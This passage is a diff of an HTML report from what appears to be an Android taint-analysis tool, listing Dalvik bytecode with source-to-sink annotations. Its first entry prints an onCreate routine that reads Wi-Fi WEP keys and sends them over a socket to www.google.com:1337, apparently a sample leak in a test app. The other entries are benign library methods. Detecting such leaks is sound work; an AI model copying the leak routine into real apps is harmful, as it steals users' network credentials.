@@ -67,31 +67,31 @@
 					
 					
 					
-		        <li><a href="#104544376" data-toggle="tab">onCreate(Landroid/os/Bundle;)V</a></li>
+		        <li><a href="#4380884432" data-toggle="tab">onCreate(Landroid/os/Bundle;)V</a></li>
 		        
 		      
 					
-		        <li><a href="#104552496" data-toggle="tab">startWrite()Ljava/io/FileOutputStream;</a></li>
+		        <li><a href="#4380892696" data-toggle="tab">startWrite()Ljava/io/FileOutputStream;</a></li>
 		        
 		      
 					
-		        <li><a href="#104636712" data-toggle="tab">startWrite()Ljava/io/FileOutputStream;</a></li>
+		        <li><a href="#4321736320" data-toggle="tab">startWrite()Ljava/io/FileOutputStream;</a></li>
 		        
 		      
 					
-		        <li><a href="#104637504" data-toggle="tab">startWrite()Ljava/io/FileOutputStream;</a></li>
+		        <li><a href="#4321735528" data-toggle="tab">startWrite()Ljava/io/FileOutputStream;</a></li>
 		        
 		      
 					
-		        <li><a href="#104637648" data-toggle="tab">startWrite()Ljava/io/FileOutputStream;</a></li>
+		        <li><a href="#4321736392" data-toggle="tab">startWrite()Ljava/io/FileOutputStream;</a></li>
 		        
 		      
 					
-		        <li><a href="#104741056" data-toggle="tab">loadInBackground()Landroid/database/Cursor;</a></li>
+		        <li><a href="#4321743720" data-toggle="tab">loadInBackground()Landroid/database/Cursor;</a></li>
 		        
 		      
 					
-		        <li><a href="#104543656" data-toggle="tab">onCreate(Landroid/os/Bundle;)V</a></li>
+		        <li><a href="#4321840592" data-toggle="tab">onCreate(Landroid/os/Bundle;)V</a></li>
 		        
 		      
 		        
@@ -107,108 +107,548 @@
 					<div class="tab-content">
 					
 					
+					  
 
-		        <div class="tab-pane" id="104544376">
+		        <div class="tab-pane" id="4380884432">
 							<h2>onCreate(Landroid/os/Bundle;)V</h2>
-							<h3><div class="tree">
+              <h3>Comments:</h3>
+              <pre>new-instance['v4', 'Landroid/net/wifi/WifiConfiguration;']
+invoke-direct['v4', 'Landroid/net/wifi/WifiConfiguration;', '<init>()V']
+iget-object['v0', 'v4', 'Landroid/net/wifi/WifiConfiguration;', 'wepKeys', '[Ljava/lang/String;']
+new-instance['v3', 'Ljava/net/Socket;']
+const-string['v5', "'www.google.com'"]
+const/16['v6', '1337']
+invoke-direct['v3', 'v5', 'v6', 'Ljava/net/Socket;', '<init>(Ljava/lang/String; I)V']
+new-instance['v2', 'Ljava/io/ObjectOutputStream;']
+invoke-virtual['v3', 'Ljava/net/Socket;', 'getOutputStream()Ljava/io/OutputStream;']
+move-result-object['v5']
+invoke-direct['v2', 'v5', 'Ljava/io/ObjectOutputStream;', '<init>(Ljava/io/OutputStream;)V']
+invoke-virtual['v2', 'v0', 'Ljava/io/ObjectOutputStream;', 'writeObject(Ljava/lang/Object;)V']
+return-void['']
+move-exception['v1']
+sget-object['v5', 'Ljava/lang/System;', 'err', 'Ljava/io/PrintStream;']
+invoke-virtual['v5', 'v0', 'Ljava/io/PrintStream;', 'println(Ljava/lang/Object;)V']
+invoke-virtual['v1', 'Ljava/io/IOException;', 'printStackTrace()V']
+goto['-a']
+</pre><pre>new-instance['v4', 'Landroid/net/wifi/WifiConfiguration;']
+invoke-direct['v4', 'Landroid/net/wifi/WifiConfiguration;', '<init>()V']
+iget-object['v0', 'v4', 'Landroid/net/wifi/WifiConfiguration;', 'wepKeys', '[Ljava/lang/String;']
+new-instance['v3', 'Ljava/net/Socket;']
+const-string['v5', "'www.google.com'"]
+const/16['v6', '1337']
+invoke-direct['v3', 'v5', 'v6', 'Ljava/net/Socket;', '<init>(Ljava/lang/String; I)V']
+new-instance['v2', 'Ljava/io/ObjectOutputStream;']
+invoke-virtual['v3', 'Ljava/net/Socket;', 'getOutputStream()Ljava/io/OutputStream;']
+move-result-object['v5']
+invoke-direct['v2', 'v5', 'Ljava/io/ObjectOutputStream;', '<init>(Ljava/io/OutputStream;)V']
+		Marked instruction  as sink.
+invoke-virtual['v2', 'v0', 'Ljava/io/ObjectOutputStream;', 'writeObject(Ljava/lang/Object;)V']
+		Marked instruction  as sink.
+return-void['']
+move-exception['v1']
+sget-object['v5', 'Ljava/lang/System;', 'err', 'Ljava/io/PrintStream;']
+invoke-virtual['v5', 'v0', 'Ljava/io/PrintStream;', 'println(Ljava/lang/Object;)V']
+invoke-virtual['v1', 'Ljava/io/IOException;', 'printStackTrace()V']
+goto['-a']
+</pre>
+							<h3>Tree:</h3>
+							<div class="tree">
 <ul><li>
-<a href="#">onCreate(Landroid/os/Bundle;)V<br>1 7 v5</a>
+<a href="#">onCreate(Landroid/os/Bundle;)V<br>blockIdx: 1, instructionIdx: 7, register: v5</a>
 <ul>
 <li>
-  <a href="#">onCreate(Landroid/os/Bundle;)V<br>1 7 v2</a>
+  <a href="#">onCreate(Landroid/os/Bundle;)V<br>blockIdx: 1, instructionIdx: 7, register: v2</a>
 </li>
 </ul>
 </li></ul>
 </div>
-</h3>
+
 						</div>
 		        
 		      
+					  
 
-		        <div class="tab-pane" id="104552496">
+		        <div class="tab-pane" id="4380892696">
 							<h2>startWrite()Ljava/io/FileOutputStream;</h2>
-							<h3><div class="tree">
+              <h3>Comments:</h3>
+              <pre>iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'exists()Z']
+move-result['v4']
+if-eqz['v4', '+3a']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'exists()Z']
+move-result['v4']
+if-nez['v4', '+3b']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+iget-object['v5', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v4', 'v5', 'Ljava/io/File;', 'renameTo(Ljava/io/File;)Z']
+move-result['v4']
+if-nez['v4', '+28']
+const-string['v4', "'AtomicFile'"]
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t rename file "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+const-string['v6', "' to backup file '"]
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-static['v4', 'v5', 'Landroid/util/Log;', 'w(Ljava/lang/String; Ljava/lang/String;)I']
+const/4['v3', '0']
+new-instance['v3', 'Ljava/io/FileOutputStream;']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-direct['v3', 'v4', 'Ljava/io/FileOutputStream;', '<init>(Ljava/io/File;)V']
+		Marked instruction  as sink.
+return-object['v3']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'delete()Z']
+goto['-e']
+move-exception['v0']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'getParentFile()Ljava/io/File;']
+move-result-object['v2']
+invoke-virtual['v2', 'Ljava/io/File;', 'mkdir()Z']
+move-result['v4']
+if-nez['v4', '+1d']
+new-instance['v4', 'Ljava/io/IOException;']
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t create directory "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-direct['v4', 'v5', 'Ljava/io/IOException;', '<init>(Ljava/lang/String;)V']
+throw['v4']
+new-instance['v3', 'Ljava/io/FileOutputStream;']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-direct['v3', 'v4', 'Ljava/io/FileOutputStream;', '<init>(Ljava/io/File;)V']
+goto['-36']
+move-exception['v1']
+new-instance['v4', 'Ljava/io/IOException;']
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t create "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-direct['v4', 'v5', 'Ljava/io/IOException;', '<init>(Ljava/lang/String;)V']
+throw['v4']
+</pre>
+							<h3>Tree:</h3>
+							<div class="tree">
 <ul><li>
-<a href="#">startWrite()Ljava/io/FileOutputStream;<br>5 2 v3</a>
+<a href="#">startWrite()Ljava/io/FileOutputStream;<br>blockIdx: 5, instructionIdx: 2, register: v3</a>
 </li></ul>
 </div>
-</h3>
+
 						</div>
 		        
 		      
+					  
 
-		        <div class="tab-pane" id="104636712">
+		        <div class="tab-pane" id="4321736320">
 							<h2>startWrite()Ljava/io/FileOutputStream;</h2>
-							<h3><div class="tree">
+              <h3>Comments:</h3>
+              <pre>iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'exists()Z']
+move-result['v4']
+if-eqz['v4', '+3a']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'exists()Z']
+move-result['v4']
+if-nez['v4', '+3b']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+iget-object['v5', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v4', 'v5', 'Ljava/io/File;', 'renameTo(Ljava/io/File;)Z']
+move-result['v4']
+if-nez['v4', '+28']
+const-string['v4', "'AtomicFile'"]
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t rename file "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+const-string['v6', "' to backup file '"]
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-static['v4', 'v5', 'Landroid/util/Log;', 'w(Ljava/lang/String; Ljava/lang/String;)I']
+const/4['v3', '0']
+new-instance['v3', 'Ljava/io/FileOutputStream;']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-direct['v3', 'v4', 'Ljava/io/FileOutputStream;', '<init>(Ljava/io/File;)V']
+return-object['v3']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'delete()Z']
+goto['-e']
+move-exception['v0']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'getParentFile()Ljava/io/File;']
+move-result-object['v2']
+invoke-virtual['v2', 'Ljava/io/File;', 'mkdir()Z']
+move-result['v4']
+if-nez['v4', '+1d']
+new-instance['v4', 'Ljava/io/IOException;']
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t create directory "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-direct['v4', 'v5', 'Ljava/io/IOException;', '<init>(Ljava/lang/String;)V']
+throw['v4']
+new-instance['v3', 'Ljava/io/FileOutputStream;']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-direct['v3', 'v4', 'Ljava/io/FileOutputStream;', '<init>(Ljava/io/File;)V']
+		Marked instruction  as sink.
+goto['-36']
+move-exception['v1']
+new-instance['v4', 'Ljava/io/IOException;']
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t create "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-direct['v4', 'v5', 'Ljava/io/IOException;', '<init>(Ljava/lang/String;)V']
+throw['v4']
+</pre>
+							<h3>Tree:</h3>
+							<div class="tree">
 <ul><li>
-<a href="#">startWrite()Ljava/io/FileOutputStream;<br>10 2 v3</a>
+<a href="#">startWrite()Ljava/io/FileOutputStream;<br>blockIdx: 10, instructionIdx: 2, register: v3</a>
 </li></ul>
 </div>
-</h3>
+
 						</div>
 		        
 		      
+					  
 
-		        <div class="tab-pane" id="104637504">
+		        <div class="tab-pane" id="4321735528">
 							<h2>startWrite()Ljava/io/FileOutputStream;</h2>
-							<h3><div class="tree">
+              <h3>Comments:</h3>
+              <pre>iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'exists()Z']
+move-result['v4']
+if-eqz['v4', '+3a']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'exists()Z']
+move-result['v4']
+if-nez['v4', '+3b']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+iget-object['v5', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v4', 'v5', 'Ljava/io/File;', 'renameTo(Ljava/io/File;)Z']
+move-result['v4']
+if-nez['v4', '+28']
+const-string['v4', "'AtomicFile'"]
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t rename file "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+const-string['v6', "' to backup file '"]
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-static['v4', 'v5', 'Landroid/util/Log;', 'w(Ljava/lang/String; Ljava/lang/String;)I']
+const/4['v3', '0']
+new-instance['v3', 'Ljava/io/FileOutputStream;']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-direct['v3', 'v4', 'Ljava/io/FileOutputStream;', '<init>(Ljava/io/File;)V']
+		Marked instruction  as sink.
+return-object['v3']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'delete()Z']
+goto['-e']
+move-exception['v0']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'getParentFile()Ljava/io/File;']
+move-result-object['v2']
+invoke-virtual['v2', 'Ljava/io/File;', 'mkdir()Z']
+move-result['v4']
+if-nez['v4', '+1d']
+new-instance['v4', 'Ljava/io/IOException;']
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t create directory "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-direct['v4', 'v5', 'Ljava/io/IOException;', '<init>(Ljava/lang/String;)V']
+throw['v4']
+new-instance['v3', 'Ljava/io/FileOutputStream;']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-direct['v3', 'v4', 'Ljava/io/FileOutputStream;', '<init>(Ljava/io/File;)V']
+goto['-36']
+move-exception['v1']
+new-instance['v4', 'Ljava/io/IOException;']
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t create "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-direct['v4', 'v5', 'Ljava/io/IOException;', '<init>(Ljava/lang/String;)V']
+throw['v4']
+</pre>
+							<h3>Tree:</h3>
+							<div class="tree">
 <ul><li>
-<a href="#">startWrite()Ljava/io/FileOutputStream;<br>5 2 v3</a>
+<a href="#">startWrite()Ljava/io/FileOutputStream;<br>blockIdx: 5, instructionIdx: 2, register: v3</a>
 </li></ul>
 </div>
-</h3>
+
 						</div>
 		        
 		      
+					  
 
-		        <div class="tab-pane" id="104637648">
+		        <div class="tab-pane" id="4321736392">
 							<h2>startWrite()Ljava/io/FileOutputStream;</h2>
-							<h3><div class="tree">
+              <h3>Comments:</h3>
+              <pre>iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'exists()Z']
+move-result['v4']
+if-eqz['v4', '+3a']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'exists()Z']
+move-result['v4']
+if-nez['v4', '+3b']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+iget-object['v5', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v4', 'v5', 'Ljava/io/File;', 'renameTo(Ljava/io/File;)Z']
+move-result['v4']
+if-nez['v4', '+28']
+const-string['v4', "'AtomicFile'"]
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t rename file "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+const-string['v6', "' to backup file '"]
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBackupName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-static['v4', 'v5', 'Landroid/util/Log;', 'w(Ljava/lang/String; Ljava/lang/String;)I']
+const/4['v3', '0']
+new-instance['v3', 'Ljava/io/FileOutputStream;']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-direct['v3', 'v4', 'Ljava/io/FileOutputStream;', '<init>(Ljava/io/File;)V']
+return-object['v3']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'delete()Z']
+goto['-e']
+move-exception['v0']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v4', 'Ljava/io/File;', 'getParentFile()Ljava/io/File;']
+move-result-object['v2']
+invoke-virtual['v2', 'Ljava/io/File;', 'mkdir()Z']
+move-result['v4']
+if-nez['v4', '+1d']
+new-instance['v4', 'Ljava/io/IOException;']
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t create directory "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-direct['v4', 'v5', 'Ljava/io/IOException;', '<init>(Ljava/lang/String;)V']
+throw['v4']
+new-instance['v3', 'Ljava/io/FileOutputStream;']
+iget-object['v4', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-direct['v3', 'v4', 'Ljava/io/FileOutputStream;', '<init>(Ljava/io/File;)V']
+		Marked instruction  as sink.
+goto['-36']
+move-exception['v1']
+new-instance['v4', 'Ljava/io/IOException;']
+new-instance['v5', 'Ljava/lang/StringBuilder;']
+invoke-direct['v5', 'Ljava/lang/StringBuilder;', '<init>()V']
+const-string['v6', '"Couldn\'t create "']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/String;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+iget-object['v6', 'v7', 'Landroid/support/v4/util/AtomicFile;', 'mBaseName', 'Ljava/io/File;']
+invoke-virtual['v5', 'v6', 'Ljava/lang/StringBuilder;', 'append(Ljava/lang/Object;)Ljava/lang/StringBuilder;']
+move-result-object['v5']
+invoke-virtual['v5', 'Ljava/lang/StringBuilder;', 'toString()Ljava/lang/String;']
+move-result-object['v5']
+invoke-direct['v4', 'v5', 'Ljava/io/IOException;', '<init>(Ljava/lang/String;)V']
+throw['v4']
+</pre>
+							<h3>Tree:</h3>
+							<div class="tree">
 <ul><li>
-<a href="#">startWrite()Ljava/io/FileOutputStream;<br>10 2 v3</a>
+<a href="#">startWrite()Ljava/io/FileOutputStream;<br>blockIdx: 10, instructionIdx: 2, register: v3</a>
 </li></ul>
 </div>
-</h3>
+
 						</div>
 		        
 		      
+					  
 
-		        <div class="tab-pane" id="104741056">
+		        <div class="tab-pane" id="4321743720">
 							<h2>loadInBackground()Landroid/database/Cursor;</h2>
-							<h3><div class="tree">
+              <h3>Comments:</h3>
+              <pre>invoke-virtual['v7', 'Landroid/support/v4/content/CursorLoader;', 'getContext()Landroid/content/Context;']
+move-result-object['v0']
+invoke-virtual['v0', 'Landroid/content/Context;', 'getContentResolver()Landroid/content/ContentResolver;']
+move-result-object['v0']
+iget-object['v1', 'v7', 'Landroid/support/v4/content/CursorLoader;', 'mUri', 'Landroid/net/Uri;']
+iget-object['v2', 'v7', 'Landroid/support/v4/content/CursorLoader;', 'mProjection', '[Ljava/lang/String;']
+iget-object['v3', 'v7', 'Landroid/support/v4/content/CursorLoader;', 'mSelection', 'Ljava/lang/String;']
+iget-object['v4', 'v7', 'Landroid/support/v4/content/CursorLoader;', 'mSelectionArgs', '[Ljava/lang/String;']
+iget-object['v5', 'v7', 'Landroid/support/v4/content/CursorLoader;', 'mSortOrder', 'Ljava/lang/String;']
+invoke-virtual/range['v0', 'v1', 'v2', 'v3', 'v4', 'v5', 'Landroid/content/ContentResolver;', 'query(Landroid/net/Uri; [Ljava/lang/String; Ljava/lang/String; [Ljava/lang/String; Ljava/lang/String;)Landroid/database/Cursor;']
+move-result-object['v6']
+if-eqz['v6', '+a']
+invoke-interface['v6', 'Landroid/database/Cursor;', 'getCount()I']
+iget-object['v0', 'v7', 'Landroid/support/v4/content/CursorLoader;', 'mObserver', 'Landroid/support/v4/content/Loader$ForceLoadContentObserver;']
+invoke-virtual['v7', 'v6', 'v0', 'Landroid/support/v4/content/CursorLoader;', 'registerContentObserver(Landroid/database/Cursor; Landroid/database/ContentObserver;)V']
+return-object['v6']
+</pre><pre>iget-object['v0', 'v1', 'Landroid/support/v4/content/CursorLoader;', 'mObserver', 'Landroid/support/v4/content/Loader$ForceLoadContentObserver;']
+invoke-interface['v2', 'v0', 'Landroid/database/Cursor;', 'registerContentObserver(Landroid/database/ContentObserver;)V']
+return-void['']
+</pre><pre>invoke-virtual['v1', 'Landroid/support/v4/content/CursorLoader;', 'loadInBackground()Landroid/database/Cursor;']
+move-result-object['v0']
+return-object['v0']
